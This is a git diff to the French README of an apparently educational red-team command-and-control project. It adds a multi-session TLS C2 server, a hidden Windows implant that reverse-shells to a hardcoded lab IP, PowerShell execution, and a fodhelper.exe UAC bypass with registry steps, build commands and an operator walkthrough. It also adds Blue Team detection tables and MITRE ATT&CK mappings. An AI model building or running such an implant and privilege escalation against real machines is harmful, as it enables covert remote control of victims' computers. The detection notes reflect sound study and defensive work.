@@ -15,6 +15,7 @@
 - [Utilisation](#utilisation)
 - [Chiffrement](#chiffrement)
 - [Persistance](#persistance)
+- [Élévation de privilèges](#élévation-de-privilèges--uac-bypass-t1548002)
 - [MITRE ATT\&CK](#mitre-attck)
 - [Known Weaknesses](#known-weaknesses)
 - [Sources & Références](#sources--références)
@@ -31,9 +32,14 @@
 | 2 | Preuve de chiffrement (tcpdump/Wireshark) | ✅ Validé |
 | 2 | C2 server en C (remplacement Python) | ✅ Fonctionnel |
 | 2 | Persistance (Registry Run Key T1547.001) | ✅ Fonctionnel |
+| 2 | C2 multi-client (sessions simultanées, pthreads) | ✅ Fonctionnel |
+| 2 | Exécution PowerShell (T1059.001) | ✅ Fonctionnel |
+| 2 | UAC Bypass — fodhelper.exe (T1548.002) | ✅ Fonctionnel |
+| 2 | Commande `elevate` (auto-détection + auto-switch session admin) | ✅ Fonctionnel |
+| 2 | Implant standalone (certificats embarqués, zéro dépendance) | ✅ Fonctionnel |
 | 3 | AV evasion (obfuscation strings) | 📋 Planifié |
 | 3 | Log rollback | 📋 Planifié |
-| 3 | Payloads avancés (loot, privesc, keylog) | 📋 Planifié |
+| 3 | Payloads avancés (loot, keylog) | 📋 Planifié |
  
 ---
 
@@ -132,10 +138,10 @@ pacman -S mingw-w64-x86_64-gcc mingw-w64-x86_64-openssl
 ```bash
 cd /c/chemin/vers/s0P0wn3d/src/controller/server
  
-gcc -Wall -Wextra -O2 \
-    -DC2_IP=\"192.168.56.104\" -DC2_PORT=4444 \
-    -o implant.exe implant.c tls.c \
-    -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -static -s -mwindows
+gcc -Wall -Wextra \
+    -DC2_IP=\"192.168.56.101\" -DC2_PORT=4444 \
+    -o implant.exe implant.c tls.c privesc.c \
+    -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32 -static -s
 ```
 
 > **Debug** (affiche les erreurs TLS dans une console) : retirer `-mwindows`
@@ -180,17 +186,174 @@ cd src/controller/server
 
 Double-clic sur `implant.exe` — aucune fenêtre n'apparaît. L'implant se reconnecte automatiquement toutes les 5s si le C2 n'est pas disponible.
 
-### Shell interactif
+### Shell interactif (multi-client)
+
+Le C2 est maintenant **multi-client** : il accepte plusieurs implants simultanément. La première connexion est automatiquement sélectionnée.
 
 ```
+[*] C2 Server — TLS/mTLS (multi-client)
 [TLS] Écoute sur 0.0.0.0:4444
-[+] Implant connecté (TLSv1.3)
-[C2]> whoami
-desktop-99de0lj\target
-[C2]> ipconfig
-[...]
-[C2]> exit
+[*] En attente de connexion…
+[+] Implant connecté — session #0
+
+[*] Session #0 — Implant #0 (TLSv1.3)
+[S0]> whoami
+desktop-target\user
 ```
+
+#### Commandes du menu principal `[C2]>`
+
+| Commande | Description |
+|----------|-------------|
+| `sessions` / `list` | Affiche toutes les sessions (actives et mortes) |
+| `use <id>` | Entre dans le shell interactif d'une session |
+| `exit` / `quit` | Ferme toutes les sessions et quitte le C2 |
+| `help` | Affiche l'aide |
+
+#### Commandes dans une session `[S<id>]>`
+
+| Commande | Description |
+|----------|-------------|
+| `<commande>` | Exécutée par l'implant via cmd.exe |
+| `ps <commande>` | Exécutée via PowerShell |
+| `elevate` | UAC bypass : lance une session admin (voir section ci-dessous) |
+| `bg` / `background` | Retour au menu principal sans fermer la session |
+| `close` | Ferme la session (kill l'implant) et retour au menu |
+| `exit` | Envoie 'exit' à l'implant (il s'arrête définitivement) |
+ 
+---
+
+## Élévation de privilèges — UAC Bypass (T1548.002)
+
+### Principe
+
+L'implant peut s'auto-élever en **administrateur** sans déclencher le prompt UAC, via l'exécutable Windows `fodhelper.exe`.
+
+**fodhelper.exe** est un binaire Microsoft signé, marqué "auto-elevate" dans son manifeste. Avant de démarrer, il lit une commande depuis la clé de registre :
+
+```
+HKCU\Software\Classes\ms-settings\Shell\Open\command
+```
+
+Comme `HKCU` est accessible en écriture par l'utilisateur courant (sans admin), on y écrit le chemin de l'implant. Quand fodhelper se lance, il exécute notre commande **en contexte administrateur**.
+
+### Étapes de l'attaque (automatisées par la commande `elevate`)
+
+```
+1. L'implant détecte son propre chemin (GetModuleFileNameA)
+2. Il crée la clé de registre ms-settings\Shell\Open\command
+3. Il écrit : cmd /c cd /d "dossier" && "implant.exe"
+4. Il crée une valeur vide "DelegateExecute" (force le handler)
+5. Il lance fodhelper.exe (fenêtre cachée, ShellExecuteExA)
+6. fodhelper s'auto-élève et exécute l'implant en admin
+7. L'implant élevé se connecte au C2 → nouvelle session (#1)
+8. Le C2 détecte la nouvelle session et switch dessus
+9. L'implant nettoie les clés de registre
+```
+
+### Prérequis
+
+- L'utilisateur Windows doit être **membre du groupe local Administrateurs**
+- L'UAC doit être activé (paramètre par défaut)
+- Ne fonctionne **PAS** si l'UAC est réglé sur "Toujours notifier" (niveau max)
+
+### Procédure de test pas à pas
+
+#### 1. Compiler l'implant (MSYS2 MINGW64 sur la VM Windows)
+
+```bash
+cd /c/shared/s0P0wn3d/src/controller/server
+
+gcc -Wall -Wextra \
+    -DC2_IP=\"192.168.56.101\" -DC2_PORT=4444 \
+    -o implant.exe implant.c tls.c privesc.c \
+    -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32 \
+    -static -s
+```
+
+> **Important** : `privesc.c` et `-lshell32` sont nécessaires pour le UAC bypass.
+> Ne pas mettre `-O2` (bug ICE avec MinGW). Ne pas mettre `-mwindows` pour voir les logs.
+
+#### 2. Lancer le C2 (Ubuntu)
+
+```bash
+cd /media/sf_shared/s0P0wn3d/src/controller/server
+./c2_server
+```
+
+Le C2 affiche :
+```
+[*] C2 Server — TLS/mTLS (multi-client)
+[TLS] Écoute sur 0.0.0.0:4444
+[*] En attente de connexion…
+```
+
+#### 3. Lancer l'implant (Windows)
+
+Copier `implant.exe` dans le dossier contenant `.env` et `certs/`, puis double-clic (ou lancer depuis cmd).
+
+Le C2 reçoit la connexion et entre automatiquement dans la session :
+```
+[+] Implant connecté — session #0
+
+[*] Session #0 — Implant #0 (TLSv1.3)
+[S0]>
+```
+
+#### 4. Vérifier les privilèges actuels
+
+```
+[S0]> whoami /priv
+```
+
+Vous devez voir des privilèges **limités** (pas de `SeDebugPrivilege`, etc.).
+
+#### 5. Lancer l'élévation
+
+```
+[S0]> elevate
+```
+
+Le C2 affiche :
+```
+[elevate] success — C:\chemin\implant.exe launched as admin
+
+[*] Attente de la session élevée…
+[+] Session élevée #1 connectée !
+
+[*] Session #1 — Implant #1 (TLSv1.3)
+[S1]>
+```
+
+Vous êtes maintenant dans la **session admin** (#1).
+
+#### 6. Vérifier l'élévation
+
+```
+[S1]> whoami /priv
+```
+
+Vous devez voir les privilèges **complets** dont `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.
+
+#### 7. Navigation entre sessions
+
+```
+[S1]> bg              # retour à la session #0 (standard)
+[S0]> bg              # retour au menu principal [C2]>
+[C2]> sessions        # liste toutes les sessions
+[C2]> use 1           # revenir dans la session admin
+[S1]> close           # fermer la session admin (kill l'implant élevé)
+```
+
+### Détection (Blue Team)
+
+| Indicateur | Description |
+|-----------|-------------|
+| Sysmon Event ID 13 | `SetValue` sur `HKCU\...\ms-settings\Shell\Open\command` |
+| Sysmon Event ID 1 | `fodhelper.exe` avec `ParentImage` inhabituel |
+| Event ID 4657 | Modification de clé de registre `ms-settings` |
+| Event ID 4688 | Création de processus `cmd.exe` par `fodhelper.exe` |
+| Procmon (Sysinternals) | Surveiller les accès registre de `fodhelper.exe` |
  
 ---
 
@@ -257,9 +420,11 @@ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 
 | Capacité | Tactic | Technique | ID | Blue Team Note |
 |----------|--------|-----------|-----|----------------|
-| **Reverse shell** | Execution | Windows Command Shell | T1059.003 | Surveiller les processus `cmd.exe` spawné par un process non-interactif. Event ID 4688 + Sysmon Event ID 1. |
+| **Reverse shell (cmd.exe)** | Execution | Windows Command Shell | T1059.003 | Surveiller les processus `cmd.exe` spawné par un process non-interactif. Event ID 4688 + Sysmon Event ID 1. |
+| **Exécution PowerShell** | Execution | PowerShell | T1059.001 | `powershell.exe -NoProfile -ExecutionPolicy Bypass`. Sysmon Event ID 1 + ScriptBlock Logging (Event ID 4104). |
 | **Canal C2 mTLS** | Command and Control | Encrypted Channel — Symmetric Cryptography | T1573.001 | Connexion TLSv1.3 sortante persistante vers port 4444. Règle réseau : bloquer les connexions sortantes non whitelistées. Certificats clients comme IOC. |
 | **Pipe anonyme (exec)** | Defense Evasion | Process Injection / Masquerading | T1055 | `cmd.exe` spawné sans console (`CREATE_NO_WINDOW`). Sysmon Event ID 1 : détecter `cmd.exe` avec `ParentImage` non-standard. |
+| **UAC Bypass fodhelper** | Privilege Escalation | Bypass User Account Control | T1548.002 | Surveiller les écritures sur `HKCU\...\ms-settings\Shell\Open\command`. Sysmon Event ID 13. Détecter `fodhelper.exe` avec `ParentImage` inhabituel. |
 | **Persistance Registry Run Key** | Persistence | Registry Run Keys / Startup Folder | T1547.001 | Surveiller `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Event ID 4657 ou Sysmon Event ID 13. Comparer la baseline du registre au démarrage. |
 
 ### Capacités planifiées
@@ -268,7 +433,7 @@ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 |----------|--------|-----------|-----|----------------|
 | **Keylogger** | Collection | Keylogging | T1056.001 | Hook clavier via `SetWindowsHookEx(WH_KEYBOARD_LL)`. Sysmon Event ID 10. Antivirus comportemental. |
 | **Loot (exfiltration)** | Collection / Exfiltration | Data from Local System | T1005 | Surveiller les accès aux fichiers sensibles (`SAM`, `.ssh/`). Event ID 4663. |
-| **Privesc** | Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Auditer les misconfigurations locales. Event ID 4672. |
+| **Privesc (autres vecteurs)** | Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Auditer les misconfigurations locales. Event ID 4672. |
 | **AV evasion** | Defense Evasion | Obfuscated Files or Information | T1027 | XOR string obfuscation, packer. |
  
 ---
@@ -296,9 +461,14 @@ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 - [Havoc C2](https://github.com/HavocFramework/Havoc) — architecture de référence
 ### MITRE ATT&CK
 - [T1059.003 — Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
+- [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
 - [T1573.001 — Symmetric Cryptography](https://attack.mitre.org/techniques/T1573/001/)
+- [T1548.002 — Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
 - [T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)
 - [T1547.001 — Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
+### UAC Bypass
+- [fodhelper.exe UAC Bypass — Pentestlab](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)
+- [ShellExecuteExA — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexa)
 ### Windows Internals
 - [CreateProcess + anonymous pipes](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
 - [RegSetValueEx — Registry API](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)
